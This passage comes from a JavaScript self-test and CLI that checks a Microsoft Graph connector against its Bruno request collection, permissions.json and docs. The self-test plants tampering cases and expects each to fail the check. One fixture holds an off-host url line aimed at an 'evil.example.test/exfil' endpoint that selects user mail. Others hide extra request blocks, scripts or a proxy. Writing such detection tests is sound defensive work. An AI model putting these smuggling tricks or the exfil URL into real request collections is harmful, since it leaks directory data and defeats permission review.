  let o = permObj(); o.application = o.application.filter((p) => p.permission !== "IdentityRiskyUser.Read.All");
  c = audit(csrc, baseBru(), pj(o));
  checks.push(["COLLECTION: a scope missing from permissions.json is FATAL and names the 403/unknown consequence", has(c, "IdentityRiskyUser.Read.All", "403", "unknown")]);
  o = permObj(); o.application.push({ permission: "Directory.Read.All", usedBy: [], why: "x" });
  checks.push(["COLLECTION: an extra permission is FATAL — a grant the code cannot justify", has(audit(csrc, baseBru(), pj(o)), "Directory.Read.All")]);
  b = baseBru(); b["e.bru"] = bru("/groups");
  checks.push(["COLLECTION: an extra request file is FATAL — it asserts more than the connector does", has(audit(csrc, b), "e.bru", "asserts")]);
  b = baseBru(); b["b.bru"] = bru(`${P.users},mail`);
  c = audit(csrc, b);
  checks.push(["COLLECTION: a $select widened in a .bru is FATAL (exact path+query, so a path-only compare would miss it)", has(c, "b.bru", ",mail") && has(c, "no request file")]);
  c = audit(csrc.replace("accountEnabled`", "accountEnabled,mail`"));
  checks.push(["COLLECTION: a $select widened in the connector text is FATAL", has(c, "accountEnabled,mail", "no request file")]);
  b = baseBru(); b["b.bru"] = bru(P.users, "post");
  checks.push(["COLLECTION: a POST .bru is FATAL", has(audit(csrc, b), "b.bru", "POST")]);
  b = baseBru(); b["b.bru"] = bru(P.users, "get", "{{other}}");
  checks.push(["COLLECTION: a url not prefixed {{baseUrl}}/ is FATAL", has(audit(csrc, b), "b.bru", "{{baseUrl}}")]);
  o = permObj(); o.application[1].usedBy.push("GET /nope");
  checks.push(["COLLECTION: a usedBy naming a non-request is FATAL", has(audit(csrc, baseBru(), pj(o)), "/nope", "never makes")]);
  o = permObj(); o.application[2].usedBy = [];
  checks.push(["COLLECTION: a request with no usedBy is FATAL", has(audit(csrc, baseBru(), pj(o)), "riskyUsers", "usedBy")]);
  o = permObj(); o.delegated.push({ permission: "Mail.Read.All", usedBy: [], why: "x" });
  checks.push(["COLLECTION: a delegated entry the connector never names is FATAL", has(audit(csrc, baseBru(), pj(o)), "Mail.Read.All")]);
  checks.push(["COLLECTION: unparseable permissions.json is FATAL", has(audit(csrc, baseBru(), "{not json"), "does not parse")]);
  checks.push(["COLLECTION: a wrong-shaped permissions.json is FATAL", has(audit(csrc, baseBru(), pj({ application: {} })), "not an array")]);
  const gone = loadCollection(join(repoRoot, "no-such-root"));
  checks.push(["COLLECTION: a missing directory and a missing permissions.json are each FATAL, never a skip", gone.fatal.length === 4 && gone.fatal.every((f) => f.includes("missing"))]);
  const two = csrc.split("\n").filter((l) => !l.includes("managedDevices`;") && !l.startsWith("const a")).join("\n");
  checks.push(["FLOOR: under three connector request literals is FATAL", has(audit(two), "floor", "connector yields")]);
  b = baseBru(); delete b["c.bru"]; delete b["d.bru"];
  checks.push(["FLOOR: under three request files is FATAL", has(audit(csrc, b), "floor", "request file")]);
  o = permObj(); o.application = o.application.slice(0, 1);
  checks.push(["FLOOR: under two permissions is FATAL", has(audit(csrc, baseBru(), pj(o)), "floor", "permission(s)")]);
  const liveC = loadCollection(repoRoot);
  const liveSrc = readFileSync(join(repoRoot, CONNECTOR), "utf8");
  const liveDoc = readFileSync(join(repoRoot, DOC), "utf8");
  const liveAll = auditAll(liveSrc, liveDoc, liveC);
  checks.push(["LIVE COLLECTION: the real collection and permissions.json match the real connector", liveAll.fatal.length === 0 && liveAll.counts.connectorRequests >= 3]);
  // The CLI's own aggregation (auditAll), not just auditCollection: drift in the loaded collection must reach the exit code.
  const driftB = { ...liveC.bruByName }; delete driftB["identityprotection-risky-users.bru"];
  checks.push(["MAIN PATH: the aggregation the CLI exits on carries a collection finding (a dropped aggregate would pass)", auditAll(liveSrc, liveDoc, { ...liveC, bruByName: driftB }).fatal.some((f) => f.includes("riskyUsers"))]);
  checks.push(["MAIN PATH: a loader fatal (missing folder) reaches the same aggregate", auditAll(liveSrc, liveDoc, { ...liveC, fatal: ["x: missing"] }).fatal.includes("x: missing")]);
  // ---- review round 1 plants ----
  o = permObj(); o.recommended = [{ permission: "Directory.Read.All", usedBy: ["GET /groups"] }];
  checks.push(["ROUND1: a grant under an unknown top-level key of permissions.json is FATAL", has(audit(csrc, baseBru(), pj(o)), "unknown top-level key", "recommended")]);
  checks.push(["ROUND1: a fifth read written as string concatenation is FATAL (the literal scan cannot see it)", has(audit(csrc + "\nconst e = this.baseUrl + \"/groups\";"), "this.baseUrl", "outside")]);
  checks.push(["ROUND1: a fifth read through a graphUrl(path) helper is FATAL", has(audit(csrc + "\nprivate graphUrl(path) { return `${this.baseUrl}${path}`; }"), "this.baseUrl", "outside")]);
  b = baseBru(); b["b.bru"] = bru(P.users + " &$expand=manager");
  checks.push(["ROUND1: a url with content after the first space is FATAL (Bruno sends the whole line)", has(audit(csrc, b), "b.bru", "whitespace inside")]);
  o = permObj(); o.delegated.push({ permission: "User.Read.All", usedBy: [`GET ${P.users}`] });
  checks.push(["ROUND1: a delegated duplicate of an application scope is FATAL", has(audit(csrc, baseBru(), pj(o)), "delegated[0]", "application token")]);
  checks.push(["ROUND1: Sandbox.bru pointing at /beta is FATAL", has(audit(csrc, baseBru(), pj(permObj()), ENV.replace("v1.0", "beta")), "Sandbox.bru", "beta")]);
  checks.push(["ROUND1: a missing Sandbox baseUrl is FATAL", has(audit(csrc, baseBru(), pj(permObj()), "vars {\n}\n"), "Sandbox.bru", "missing")]);
  b = baseBru(); b["e.bru"] = "meta {\n  name: x\n}\n\ndocs {\n  nothing\n}\n";
  checks.push(["ROUND1: an unparseable request file is FATAL, not skipped", has(audit(csrc, b), "e.bru", "method block")]);
  b = baseBru(); b["extra/groups.bru"] = bru("/groups");
  checks.push(["ROUND1: a request file in a subdirectory is FATAL", has(audit(csrc, b), "extra/groups.bru", "subdirectory")]);
  // ---- review round 2 plants ----
  const chokeBase = csrc + "\n";
  checks.push(["ROUND2: the live connector has no choke-point violation", chokePointViolations(liveSrc).length === 0]);
  for (const [label, extra] of [
    ["a hard-coded absolute URL handed to getAllPages", 'return this.getAllPages("https://graph.microsoft.com/v1.0/groups?$select=id");'],
    ["a destructured baseUrl read", "const { baseUrl } = this; return this.rawGet(`${baseUrl}/groups`);"],
    ["bracket access to baseUrl", 'return this.rawGet(`${this["baseUrl"]}/groups`);'],
    ["an absolute URL handed to rawGet", 'return this.rawGet("https://graph.microsoft.com/v1.0/groups");'],
  ]) checks.push([`ROUND2: ${label} is FATAL`, has(audit(chokeBase + extra), "cannot transcribe")]);
  // ---- review round 3 plants: Bruno merges every http block and the LAST wins; the gate must not read the first ----
  const blk = (m, url) => `\n${m} {\n  url: ${url}\n  body: none\n  auth: inherit\n}\n`;
  const wide = P.users + ",mail,jobTitle";
  for (const [label, edit, needle] of [
    ["a second POST block appended", (t) => t + blk("post", "{{baseUrl}}/users"), "method block"],
    ["a second GET block with a widened $select", (t) => t + blk("get", "{{baseUrl}}" + wide), "method block"],
    ["a PATCH block after the GET", (t) => t + blk("patch", "{{baseUrl}}/users/x"), "method block"],
    ["a decoy GET inside the meta name above a widened real block", (t) => t.replace("name: x", "name: get { url: {{baseUrl}}" + P.users + " }").replace(P.users, wide), "braces, backticks"],
    ["a multi-line decoy GET inside docs above a DELETE-only request", (t) => `meta {\n  name: x\n}\n\ndelete {\n  url: {{baseUrl}}/users/0\n}\n\ndocs {\n  get {\n    url: {{baseUrl}}${P.users}\n  }\n}\n`, "not indented prose"],
    ["text outside any block", (t) => t + "\nstray line\n", "outside any block"],
    ["a duplicate url key in the method block", (t) => t.replace("body: none", "url: {{baseUrl}}" + wide + "\n  body: none"), "method block keys"],
  ]) { b = baseBru(); b["b.bru"] = edit(b["b.bru"]); checks.push([`ROUND3: ${label} is FATAL`, has(audit(csrc, b), "b.bru", needle)]); }
  // ---- review round 5: Bruno's triple-quote multiline value ----
  const TQ = "'" + "'" + "'";
  b = baseBru(); b["b.bru"] = `meta {\n  name: x\n}\n\nget {\n  url: {{baseUrl}}${P.users}\n  body: ${TQ}\n}\ndocs {\n${TQ}\n  url: https://evil.example.test/exfil?$select=id,mail\n  auth: inherit\n}\n`;
  checks.push(["ROUND5: a triple-quote value that swallows the closing brace and a later off-host url line is FATAL", has(audit(csrc, b), "b.bru", "multiline")]);
  b = baseBru(); b["b.bru"] = b["b.bru"].replace("x\n}", `x ${TQ}\n}`);
  checks.push(["ROUND5: a triple-quote anywhere in a request file is FATAL (docs included)", has(audit(csrc, b), "b.bru", "multiline")]);
  checks.push(["ROUND5: a triple-quote in Sandbox.bru is FATAL", has(audit(csrc, baseBru(), pj(permObj()), ENV.replace("graphToken: x", `graphToken: ${TQ}`)), "Sandbox.bru", "multiline")]);
  // ---- review round 5b: a grammar too narrow for parser divergence ----
  for (const [label, edit, needle] of [
    ["a body other than none", (t) => t.replace("body: none", "body: json"), "not `none`"],
    ["an auth other than inherit", (t) => t.replace("auth: inherit", "auth: none"), "not `inherit`"],
    ["a docs line with a brace", (t) => t.replace("docs {\n  x\n}", "docs {\n  x { y\n}"), "not indented prose"],
    ["an unindented docs line", (t) => t.replace("docs {\n  x\n}", "docs {\nx\n}"), "not indented prose"],
    ["an unknown meta key", (t) => t.replace("name: x", "name: x\n  tags: y"), "meta key"],
    ["a backtick in a meta name", (t) => t.replace("name: x", "name: `x`"), "braces, backticks"],
  ]) { b = baseBru(); b["b.bru"] = edit(b["b.bru"]); checks.push([`ROUND5: ${label} is FATAL`, has(audit(csrc, b), "b.bru", needle)]); }
  // ---- review round 6: the other Bruno-evaluated sinks, collection.bru and bruno.json ----
  for (const [label, edit, needle] of [
    ["an indented script:pre-request block in collection.bru", (t) => t + "\n\tscript:pre-request {\n  req.setUrl('x');\n}\n", "outside any block"],
    ["a space-indented script block in collection.bru", (t) => t + "\n  script:pre-request {\n  x\n}\n", "outside any block"],
    ["a column-0 script block in collection.bru", (t) => t + "\nscript:pre-request {\n  x: y\n}\n", "exactly auth then auth:bearer"],
    ["a changed token in collection.bru", (t) => t.replace("{{graphToken}}", "evil"), "differ from"],
    ["a changed auth mode in collection.bru", (t) => t.replace("mode: bearer", "mode: none"), "differ from"],
  ]) { b = baseBru(); b["collection.bru"] = edit(b["collection.bru"]); checks.push([`ROUND6: ${label} is FATAL`, has(audit(csrc, b), "collection.bru", needle)]); }
  for (const [label, doc, needle] of [
    ["a proxy block in bruno.json", { version: "1", name: "x", type: "collection", proxy: { enabled: true, hostname: "evil" } }, "proxy"],
    ["a scripts key in bruno.json", { version: "1", name: "x", type: "collection", scripts: { moduleWhitelist: ["fs"] } }, "scripts"],
    ["an ignore list that hides a request file", { version: "1", name: "x", type: "collection", ignore: ["node_modules", "users-select.bru"] }, "ignore"],
    ["a non-string name in bruno.json", { version: "1", name: 7, type: "collection" }, "not a string"],
  ]) checks.push([`ROUND6: ${label} is FATAL`, has(audit(csrc, baseBru(), pj(permObj()), ENV, JSON.stringify(doc)), "bruno.json", needle)]);
  checks.push(["ROUND6: an unparseable bruno.json is FATAL", has(audit(csrc, baseBru(), pj(permObj()), ENV, "{nope"), "bruno.json", "does not parse")]);
  checks.push(["ROUND6: a missing bruno.json is FATAL", has(auditCollection(csrc, baseBru(), pj(permObj()), ENV), "bruno.json", "missing")]);
  // ---- review round 7: files Bruno never runs must not be counted ----
  for (const where of ["node_modules/b.bru", "xnode_modulesx/b.bru", ".git/b.bru", "sub/collection.bru", "sub/b.bru"]) {
    b = baseBru(); delete b["b.bru"]; b[where] = bru(P.users);
    checks.push([`ROUND7: ${where} (hidden or nested for Bruno, counted by a naive walk) is FATAL`, has(audit(csrc, b), where, "subdirectory")]);
  }
  b = baseBru(); b["folder.bru"] = "meta {\n  name: x\n}\n";
  checks.push(["ROUND7: a root folder.bru is FATAL", has(audit(csrc, b), "folder.bru", "folder-level")]);
  // ---- review round 8: file names Bruno skips ----
  for (const bad of [".bru", "-x.bru", "x y.bru", "x.BRU", "x..bru", "x_.bru"]) {
    b = baseBru(); delete b["b.bru"]; b[bad] = bru(P.users);
    checks.push([`ROUND8: a request file named ${JSON.stringify(bad)} is FATAL`, has(audit(csrc, b), bad, "plain")]);
  }
  checks.push(["ROUND8: the live request file names all pass the name rule", Object.keys(liveC.bruByName).every((n) => n === "collection.bru" || /^[A-Za-z0-9][A-Za-z0-9-]*\.bru$/.test(n))]);
  // ---- review round 4: Bruno ends a block (docs included) at any newline + `}` whatever follows it ----
  for (const [label, edit, needle] of [
    ["`}post {` at column 0 closing docs and opening a second http block", (t) => t.replace(/\}\s*$/, "}post {\n  url: {{baseUrl}}/users\n}\n"), "text after a closing brace"],
    ["`}get {` at column 0 with a widened $select", (t) => t.replace(/\}\s*$/, "}get {\n  url: {{baseUrl}}" + wide + "\n}\n"), "text after a closing brace"],
    ["`}` followed by text inside docs", (t) => t.replace("docs {\n  x\n}", "docs {\n  x\n}trailing"), "text after a closing brace"],
    ["a column-0 `}` line in the middle of docs (the block ends there; the rest is stray)", (t) => t.replace("docs {\n  x\n}", "docs {\n  x\n}\n  get {\n    url: {{baseUrl}}" + wide + "\n  }\n}"), "outside any block"],
  ]) { b = baseBru(); b["b.bru"] = edit(b["b.bru"]); checks.push([`ROUND4: ${label} is FATAL`, has(audit(csrc, b), "b.bru", needle)]); }
  checks.push(["ROUND3: two baseUrl entries in Sandbox.bru are FATAL (the last wins in Bruno)", has(audit(csrc, baseBru(), pj(permObj()), ENV.replace("  graphToken", "  baseUrl: https://graph.microsoft.com/beta\n  graphToken")), "2 baseUrl entries")]);
  checks.push(["ROUND3: a non-vars block in Sandbox.bru is FATAL", has(audit(csrc, baseBru(), pj(permObj()), ENV + "\nscript:pre-request {\n  x: y\n}\n"), "only vars blocks")]);
  checks.push(["ROUND3: a ReadWrite scope the connector names but permissions.json lacks is FATAL (scope shape is not only .Read.All)", has(audit(csrc + "\n// also Device.ReadWrite.All"), "Device.ReadWrite.All", "under-provisions")]);
  checks.push(["ROUND3: a bare .Read scope (User.Read) is seen", connectorScopes("// User.Read and Mail.ReadBasic.All").join() === "Mail.ReadBasic.All,User.Read"]);
  checks.push(["ROUND3: the page parser sees a ReadWrite scope row too", docScopes("| `Device.ReadWrite.All` | x |").join() === "Device.ReadWrite.All"]);
  checks.push(["ROUND2: a second transport call site is FATAL", has(audit(chokeBase + "return this.transport(req);\nreturn this.transport(req2);"), "transport is invoked")]);
  for (const blk of ["params:query { $expand: manager }", "vars:pre-request { baseUrl: https://graph.microsoft.com/beta }", 'script:pre-request { req.setUrl("x") }', "headers { x: y }"]) {
    b = baseBru(); b["b.bru"] = b["b.bru"] + "\n" + blk.replace(/ \{.*$/, " {\n  k: v\n}\n");
    checks.push([`ROUND2: a ${blk.split(" ")[0]} block in a request is FATAL`, has(audit(csrc, b), "b.bru", blk.split(" ")[0])]);
  }
  b = baseBru(); b["collection.bru"] += "\nscript:pre-request {\n  x\n}\n";
  checks.push(["ROUND2: a script block in collection.bru is FATAL", has(audit(csrc, b), "collection.bru", "script:pre-request")]);
  o = permObj(); o.application[0].alsoGrants = ["Directory.Read.All"];
  checks.push(["ROUND2: an extra key inside a permission entry is FATAL", has(audit(csrc, baseBru(), pj(o)), "alsoGrants")]);
  {
    // The CLI's own exit code, on throwaway copies outside the repo: clean -> 0, drifted -> 1.
    const tmp = mkdtempSync(join(tmpdir(), "graph-boundary-cli-"));
    try {
      for (const f of [CONNECTOR, DOC, COLLECTION_DIR]) { mkdirSync(dirname(join(tmp, f)), { recursive: true }); cpSync(join(repoRoot, f), join(tmp, f), { recursive: true }); }
      const run = () => spawnSync(process.execPath, [fileURLToPath(import.meta.url), "--root", tmp], { encoding: "utf8" });
      const clean = run().status;
      rmSync(join(tmp, COLLECTION_DIR, "identityprotection-risky-users.bru"));
      const drift = run().status;
      checks.push(["ROUND2: the CLI exits 0 on a clean copy and 1 on a drifted one (the exit branch itself)", clean === 0 && drift === 1]);
      cpSync(join(repoRoot, COLLECTION_DIR, "identityprotection-risky-users.bru"), join(tmp, COLLECTION_DIR, "identityprotection-risky-users.bru"));
      writeFileSync(join(tmp, COLLECTION_DIR, "extra.yml"), "x: y\n");
      checks.push(["ROUND2: a non-.bru request file (extra.yml) in the collection makes the CLI exit 1", run().status === 1]);
      rmSync(join(tmp, COLLECTION_DIR, "extra.yml"));
      writeFileSync(join(tmp, COLLECTION_DIR, "environments/Beta.bru"), "vars {\n  baseUrl: https://graph.microsoft.com/beta\n}\n");
      checks.push(["ROUND2: a second environment file makes the CLI exit 1", run().status === 1]);
    } finally { rmSync(tmp, { recursive: true, force: true }); }
  }
  {
    // The loader itself, on a throwaway tree outside the repo: nested request files are read, `environments/` is not a request, a symlink is fatal.
    const tmp = mkdtempSync(join(tmpdir(), "graph-boundary-"));
    try {
      const d = join(tmp, COLLECTION_DIR);
      mkdirSync(join(d, "extra"), { recursive: true }); mkdirSync(join(d, "environments"), { recursive: true });
      writeFileSync(join(d, "extra/groups.bru"), bru("/groups")); writeFileSync(join(d, "environments/Sandbox.bru"), ENV);
      writeFileSync(join(tmp, PERMISSIONS), pj(permObj())); symlinkSync(join(d, "extra/groups.bru"), join(d, "link.bru"));
      const l = loadCollection(tmp);
      checks.push(["ROUND1: the loader refuses a subdirectory and a symlink, and skips environments/", !("environments/Sandbox.bru" in l.bruByName) && l.fatal.some((f) => f.includes("extra") && f.includes("subdirectory")) && l.fatal.some((f) => f.includes("link.bru") && f.includes("symlink"))]);
    } finally { rmSync(tmp, { recursive: true, force: true }); }
  }
  checks.push(["ROUND1: unseenBaseUrlUses is 0 on the live connector (every read is a literal)", unseenBaseUrlUses(liveSrc) === 0]);
  const failed = checks.filter(([, ok]) => !ok);
  for (const [name, ok] of checks) console.log(`  ${ok ? "ok" : "FAIL"} — self-test: ${name}`);
  console.log(`\nself-test ${failed.length === 0 ? "passed" : "FAILED"} (${checks.length - failed.length}/${checks.length})`);
  return failed.length === 0 ? 0 : 1;
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  if (process.argv.includes("--self-test")) process.exit(selfTest());
  const ri = process.argv.indexOf("--root");
  const root = ri > -1 && process.argv[ri + 1] ? resolve(process.argv[ri + 1]) : repoRoot;
  const connectorSrc = readFileSync(join(root, CONNECTOR), "utf8");
  const lc = loadCollection(root);
  const all = auditAll(connectorSrc, readFileSync(join(root, DOC), "utf8"), lc);
  const r = all.boundary;
  console.log(`Graph permission boundary — connector reads ${r.connectorEndpoints.join(", ")}; needs ${r.connectorScopes.join(", ")}`);
  console.log(`  page tables: ${r.docEndpoints.length} endpoint(s), ${r.docScopes.length} scope(s)`);
  const n = all.counts;
  console.log(`  lab collection: ${n.connectorRequests} connector request(s), ${n.collectionFiles} collection file(s), ${n.distinctCollectionRequests} distinct collection request(s), ${n.permissions} permission(s), ${n.usedBy} usedBy entr(ies)`);
  const fatal = all.fatal;
  if (fatal.length > 0) {
    console.error(`\nGraph-permission-boundary check FAILED: ${fatal.length} problem(s).`);
    for (const f of fatal) console.error(`  ✗ ${f}`);
    process.exit(1);
  }
  console.log(`Graph-permission-boundary check passed — ${DOC} names exactly what ${CONNECTOR} reads, and ${COLLECTION_DIR} (requests and permissions.json) matches it.`);
}
